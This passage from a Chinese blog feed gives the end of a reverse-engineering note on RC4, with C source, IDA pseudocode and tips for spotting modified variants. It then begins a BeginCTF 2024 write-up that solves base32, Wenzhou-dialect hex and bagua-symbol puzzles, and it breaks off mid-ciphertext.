operator">+</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">;</span>        tmp<span class="token operator">=</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//交换s[x]和s[y]</span>        s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>tmp<span class="token punctuation">;</span>        <span class="token comment">//再生成一个随机位置，对明文进行异或</span>        t<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">;</span>        Data<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">^=</span>s<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(3)主函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>s2<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> key<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"HelloWorld"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> pData<span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"HelloWorld"</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> len<span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span>pData<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pData=%s\n"</span><span class="token punctuation">,</span>pData<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"key=%s,length=%d\n\n"</span><span class="token punctuation">,</span>key<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">rc4_init</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>key<span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"完成对S[i]的初始化，如下:\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//输出S[i]</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02X"</span><span class="token punctuation">,</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">16</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token char">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//用s2[i]暂时保存初始化过的s[i],用来解密</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        s2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"已经初始化，现在加密:\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">rc4_crypt</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>pData<span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pData=%s\n\n"</span><span class="token punctuation">,</span>pData<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"已经加密，现在解密:\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">rc4_crypt</span><span class="token punctuation">(</span>s2<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>pData<span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pData=%s\n\n"</span><span class="token punctuation">,</span>pData<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果</p><pre class="line-numbers language-none"><code class="language-none">pData&#x3D;HelloWorldkey&#x3D;HelloWorld,length&#x3D;10完成对S[i]的初始化，如下:32121C207C79CFAFBC29D5BE2DDC162C3E1A97663F8C98915115C199638DE9688B226C4D43C557E208C056ED190C544010460B839BC4ABC9CE49EF7414B40D014C0EA082FAA31D23424B531FE7049DD662D2EE319FDA73EB7A703BEC59DFB90777F2BD02D9457536275E41A4901E6D7DE4373A06872F47EA5D816588FECAB70FAD5F4ADBCBA16ABABFD348508F177EB29592B12BA2615C3C869EE03864B8DD580596C2FFA70334D8C37FB5256F94AE0071B03576BBF769215B288E553DE326A8DEF6D7670A934E13F1E8306E72FBCD1B89AAE17BD1D0B6809A44FDACA539F4F52EE6C65A852A094FD4F3788A60F833F0F9B39CA918E56BFCC7CC84241152A6C8已经初始化，现在加密:pData&#x3D;7��K�l��已经加密，现在解密:pData&#x3D;HelloWorld<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="逆向分析"><a class="markdownIt-Anchor" href="#逆向分析"></a> 逆向分析</h2><p><img src="https://s2.loli.net/2024/02/08/yT5htaPwmGvsk8r.png" alt="" / loading="lazy"></p><p>rc4共有两个函数 sub_E41000,sub_E410E0<br />下面来具体分析这两个函数，具体解释都放在图里了，看图即可</p><h4 id="sub_e41000初始化"><a class="markdownIt-Anchor" href="#sub_e41000初始化"></a> sub_E41000初始化</h4><p>函数头如下，三个值<br /><code>sub_E41000(&amp;v6, &amp;v10, strlen(&amp;v10));</code><br />对应上面源码<br /><code>void rc4_init(unsigned char *s,unsigned char *key, unsigned long Len)</code></p><p>伪代码</p><p><img src="https://s2.loli.net/2024/02/08/tOZhsIxabTy6mlG.png" alt="" / loading="lazy"></p><h4 id="sub_e410e0-加密"><a class="markdownIt-Anchor" href="#sub_e410e0-加密"></a> sub_E410E0 加密</h4><p>sub_E410E0(&amp;v6, v3, strlen(v3));</p><p>对应上面的源码:</p><p>void rc4_crypt(unsigned char *s,unsigned char *Data,unsigned long Len)</p><p>伪代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __usercall sub_E410E0@<span class="token operator">&lt;</span>eax<span class="token operator">></span><span class="token punctuation">(</span><span class="token keyword">int</span> result@<span class="token operator">&lt;</span>eax<span class="token operator">></span><span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// esi</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">unsigned</span> __int8 v6<span class="token punctuation">;</span> <span class="token comment">// dl</span>  v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a3 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">do</span>    <span class="token punctuation">&#123;</span>      v3 <span class="token operator">=</span> <span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>      v6 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>      v4 <span class="token operator">=</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> result<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>v4 <span class="token operator">+</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>v4 <span class="token operator">+</span> result<span class="token punctuation">)</span> <span class="token operator">=</span> v6<span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>v5<span class="token operator">++</span> <span class="token operator">+</span> a2<span class="token punctuation">)</span> <span class="token operator">^=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v6 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> result<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span> <span class="token operator">+</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//   Data[k]^=s[t];</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> v5 <span class="token operator">&lt;</span> a3 <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="魔改rc4"><a class="markdownIt-Anchor" href="#魔改rc4"></a> 魔改RC4</h3><p>RC4内部取随机数的算法可以进行魔改，关键要识别特征，逆向算法或者根据直接拿密文用原加密程序直接异或出明文</p><p>常见变化位置</p><ol><li>密钥经过上一步的其他加密后传入</li><li>s盒内部数据固定</li><li>rc4加密后数据进行重加密</li></ol><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><p>识别特征，内部多次限制256次循环，mod256,以及读取数据strlen的特点</p><p>参考网址：<br /><a href="https://zh.wikipedia.org/zh-hans/RC4">https://zh.wikipedia.org/zh-hans/RC4</a><br /><a href="https://zh.wikipedia.org/wiki/S%E7%9B%92">https://zh.wikipedia.org/wiki/S%E7%9B%92</a><br /><a href="https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/special/rc4/">https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/special/rc4/</a></p><p><a href="https://www.52pojie.cn/thread-800115-1-1.html">https://www.52pojie.cn/thread-800115-1-1.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BeginCTF2024个人Wp</title>
      <link href="/2024/02/07/BeginCTF2024%E4%B8%AA%E4%BA%BAWp/"/>
      <url>/2024/02/07/BeginCTF2024%E4%B8%AA%E4%BA%BAWp/</url>
      
        <content type="html"><![CDATA[<p>last updated-2.24</p><p>参考链接:</p><p><a href="https://hjug69b9j6.feishu.cn/docx/V02Rd3MyWoRPVxxTTCOcLutNnqe">BeginCTF官方WP - 飞书云文档 (feishu.cn)</a></p><p><a href="https://hw6vk9v66q.feishu.cn/docx/UIm5dwwbzo4O6IxALeZcpXdCnDh">BeginCTF 2023 Reverse 题目附件 - 飞书云文档 (feishu.cn)</a></p><p><a href="https://blog.csdn.net/Pisces50002/article/details/136073163?spm=1001.2014.3001.5502">BeginCTF2024 RE WP 部分复现-CSDN博客</a></p><p>Reverse目前未复现:ezvm,babyvm,真龙之力</p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> <strong>Misc</strong></h1><h2 id="real-check-in"><a class="markdownIt-Anchor" href="#real-check-in"></a> <strong>real check in</strong></h2><pre class="line-numbers language-Plain" data-language="Plain"><code class="language-Plain">为了选手有更好的游玩体验请及时加入beginctf2024官方群,群号:612995005从catf1y的笔记本中发现了这个神秘的代码MJSWO2LOPNLUKTCDJ5GWKX3UN5PUEM2HNFXEGVCGL4ZDAMRUL5EDAUDFL5MU6VK7O5UUYMK7GEYWWZK7NE3X2&#x3D;&#x3D;&#x3D;你能帮助我找到最后的flag吗?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>直接basecrack一波得到</p><pre class="line-numbers language-none"><code class="language-none">begin&#123;WELCOMe_to_B3GinCTF_2024_H0Pe_YOU_wiL1_11ke_i7&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="devils-word"><a class="markdownIt-Anchor" href="#devils-word"></a> <strong>devil’s word</strong></h2><pre class="line-numbers language-none"><code class="language-none">leu lia leu ng leu cai leu jau leu e cai b cai jau sa leng cai ng ng f leu b leu e sa leng cai cai ng f cai cai sa sa leu e cai a leu bo leu f cai ng ng f leu sii leu jau sa sii leu c leu ng leu sa cai sii cai d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我当时的思路看到了有15个字符，且出现了a b c d e f 盲猜是16进制，只要推断出leng lia sa sii ng leu ai bo jau 代表的数字，然后两两一组 根据flag格式是begin{}</p><p><img src="https://s2.loli.net/2024/02/19/kmWE5cFoCSIp4eA.png" alt="" / loading="lazy"></p><p>没推出来的就要爆破了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> <span class="token punctuation">(</span>ii<span class="token punctuation">,</span>jj<span class="token punctuation">,</span>kk<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    replace_dict<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'lia'</span><span class="token punctuation">:</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'leng'</span><span class="token punctuation">:</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'cai'</span><span class="token punctuation">:</span><span class="token string">'7'</span><span class="token punctuation">,</span>              <span class="token string">'jau'</span><span class="token punctuation">:</span><span class="token string">'9'</span><span class="token punctuation">,</span>              <span class="token string">'au'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ii<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span>              <span class="token string">'sii'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>jj<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span>              <span class="token string">'leu'</span><span class="token punctuation">:</span><span class="token string">'6'</span><span class="token punctuation">,</span>              <span class="token string">'bo'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>kk<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span>              <span class="token string">'sa'</span><span class="token punctuation">:</span><span class="token string">'3'</span><span class="token punctuation">,</span>              <span class="token string">'ng'</span><span class="token punctuation">:</span><span class="token string">'5'</span>            <span class="token punctuation">&#125;</span>    newlist<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> mylist<span class="token punctuation">:</span>        <span class="token keyword">for</span> key<span class="token punctuation">,</span>value <span class="token keyword">in</span> replace_dict<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            x<span class="token operator">=</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>key<span class="token punctuation">,</span>value<span class="token punctuation">)</span>        newlist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    list2<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>newlist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>newlist<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>newlist<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    list3<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> it <span class="token keyword">in</span> list2<span class="token punctuation">:</span>        list3<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>it<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>list3<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后一个一个试出来</p><pre class="line-numbers language-none"><code class="language-none">begin&#123;y0u_kn0w_w3nzhou_di4lect&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>事实上预期解法是这样的</p><p>魔鬼的语言是一个梗，指的是温州话。</p><p>密文中除了i是单个字母外，其他单个字母都是a-f，说明可能是十六进制。</p><p>那么这些奇奇怪怪的单词应该是温州话数字的读音。</p><p>去搜索温州话读音就能知道那些语言代表什么,还是要提高自己的信息搜索能力</p><h2 id="你知道中国文化嘛"><a class="markdownIt-Anchor" href="#你知道中国文化嘛"></a> <strong>你知道中国文化嘛</strong></h2><pre class="line-numbers language-none"><code class="language-noneamp;CTCZOFGFV4KMLFYUYWPRJRNHCTC36FGFS4KMLFYUYWTRJRMXCTC3OFGFR4KMLHYUYWTRJRNPCTCZOFGFS4KMLFYUYWLRJRMPCTC2OFGFT4KMLLYUYWDRJRMXCTC3OFGFQ4KMLFYUYWLRJRMHCTCZ6FGFU4KMLPYUYWLRJRMPCTCYOFGFS4KMLNYUYWHRJRM7CTC2OFGFV4KMLFYUYWPRJRM7CTCZOFGFX4KMLLYUYWPRJRNHCTC26FGFS4KMLFYUYWLRJRMXCTCY6FGFU4KMLHYUYWXRJRMHCTCZOFGFW4KMLBYUYWLRJRMXCTCYOFGFT4KMLJYUYWXRJRMXCTC26FGFX4KMLFYUYWHRJRNHCTCZ6FGFU4KMLLYUYWLRJRN&ampx3D;&#x3D;&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我当时看到后面====就猜测是个base32但是我解码解不出来  就很奇怪</p><p>先解密前面部分可以看到解密出来了八卦  有特殊字符，直接替换一下：$换成S  &amp;换成P  @换成2</p><p>这个是真难猜啊，这个地方谁想得到</p><p>解密后随波逐流一把梭</p><pre class="line-numbers language-none"><code class="language-none">☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☶☲☲☶☲☰☷☳☴☶☲☳☰☲☱☶☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☷☱☲☶☳☳☴☷☲☵☵☲☱☱☳☴☶☲☲☶☲☰☷☳☴☶☲☳☰☲☱☶☳☴☵☲☱☷☲☱☳☳☴☵☲☲☶☲☰☴☳☴☶☲☶☳☲☲☵☳☴☶☲☶☲☲☷☳☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☶☲☶☳☲☲☵☳☴☶☲☶☲☲☷☳☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☶☲☲☶☲☰☷☳☴☶☲☳☰☲☱☶☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☷☱☲☶☳☳☴☷☲☵☵☲☱☱☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☷☱☲☶☳☳☴☷☲☵☵☲☱☱☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☷☲☱☰☲☶☱☳☴☵☲☳☳☲☷☵☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☷☱☲☶☳☳☴☷☲☵☵☲☱☱☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☵☰☲☰☷☲☵☲☳☴☷☲☲☴☲☶☱☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☷☲☱☰☲☶☱☳☴☵☲☳☳☲☷☵☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☵☲☵☷☲☱☴☳☴☵☲☷☴☲☷☲☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☷☲☱☰☲☶☱☳☴☵☲☳☳☲☷☵☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☶☲☶☳☲☲☵☳☴☶☲☶☲☲☷☳☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☷☱☲☶☳☳☴☷☲☵☵☲☱☱☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☵☰☲☰☷☲☵☲☳☴☷☲☲☴☲☶☱☳☴☶☲☲☶☲☰☷☳☴☶☲☳☰☲☱☶☳☵☰☲☵☷☲☳☲☳☴☴☲☷☷☲☴☱☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☶☲☲☶☲☰☷☳☴☶☲☳☰☲☱☶☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☷☱☲☶☳☳☴☷☲☵☵☲☱☱☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☶☲☲☵☲☵☴☳☴☴☲☷☰☲☳☲☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☵☰☲☰☷☲☵☲☳☴☷☲☲☴☲☶☱☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☶☲☶☳☲☲☵☳☴☶☲☶☲☲☷☳☳☴☵☲☱☷☲☱☳☳☴☵☲☲☶☲☰☴☳☴☶☲☶☳☲☲☵☳☴☶☲☶☲☲☷☳☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☶☲☲☵☲☵☴☳☴☴☲☷☰☲☳☲☳☴☶☲☶☳☲☲☵☳☴☶☲☶☲☲☷☳☳☴☵☲☱☷☲☱☳☳☴☵☲☲☶☲☰☴☳☴☵☲☷☱☲☶☳☳☴☷☲☵☵☲☱☱☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☶☲☶☰☲☲☱☳☴☴☲☷☰☲☷☳☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☶☲☶☳☲☲☵☳☴☶☲☶☲☲☷☳☳☴☶☲☲☶☲☰☷☳☴☶☲☳☰☲☱☶☳☵☰☲☵☷☲☳☲☳☴☴☲☷☷☲☴☱☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☶☲☶☰☲☲☱☳☴☴☲☷☰☲☷☳☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☷☲☱☰☲☶☱☳☴☵☲☳☳☲☷☵☳☴☶☲☲☶☲☰☷☳☴☶☲☳☰☲☱☶☳☵☰☲☵☷☲☳☲☳☴☴☲☷☷☲☴☱☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☶☲☶☰☲☲☱☳☴☴☲☷☰☲☷☳☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☶☲☲☶☲☰☷☳☴☶☲☳☰☲☱☶☳☴☵☲☰☵☲☵☴☳☴☶☲☵